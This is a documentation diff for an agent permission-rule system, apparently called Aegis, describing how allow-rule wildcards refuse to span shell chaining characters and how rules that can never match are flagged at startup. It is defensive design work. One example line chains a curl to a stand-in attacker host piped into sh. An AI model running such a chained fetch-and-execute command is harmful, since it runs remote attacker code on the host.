@@ -69,6 +69,8 @@ deny  <tool>(<pattern>)
 
 `*` in a pattern spans path separators, so `/etc/*` matches everything under `/etc`.
 
+**Exec allow-rules and shell chaining (P7.3):** for an `allow` rule scoping a `bash`/`execute`-capability tool, `*`/`?` cannot span shell chaining/substitution characters (`; & | \` $ ( ) < > `, newline). `allow bash(npm test*)` matches `npm test --watch` but not `npm test && curl evil.com|sh` — the wildcard can't be widened into a second command. This only applies to `allow` rules; `deny` rules keep the original broad `*` (over-matching on a deny is safe — it just blocks a superset of what was intended).
+
 ### Precedence
 
 1. If any `deny` rule matches → **block** (even in auto mode)
@@ -76,6 +78,8 @@ deny  <tool>(<pattern>)
 3. Otherwise → mode gate applies normally
 
 Malformed rules are logged and skipped at startup without aborting the daemon.
+
+**Unmatchable rules (P7.7):** a rule's pattern is matched against one "subject" field extracted from the tool's input — `command` for exec tools, `path`/`file_path` for file tools, `url`/`query` for network tools, `pattern` as a fallback. A tool whose schema uses none of those names (e.g. a custom process-plugin or MCP tool with different field names) always yields an empty subject, so a scoped rule like `deny write(/etc/*)` targeting it would silently never match — a false sense of security rather than an active exploit. At startup, Aegis checks every rule against the registered tool schemas and logs a warning for any rule this affects, naming the tool and the rule text, so the gap is visible instead of silent. A `*` pattern is unaffected (it matches an empty subject too, so it's never a no-op).
 
 ### Rule Examples
 
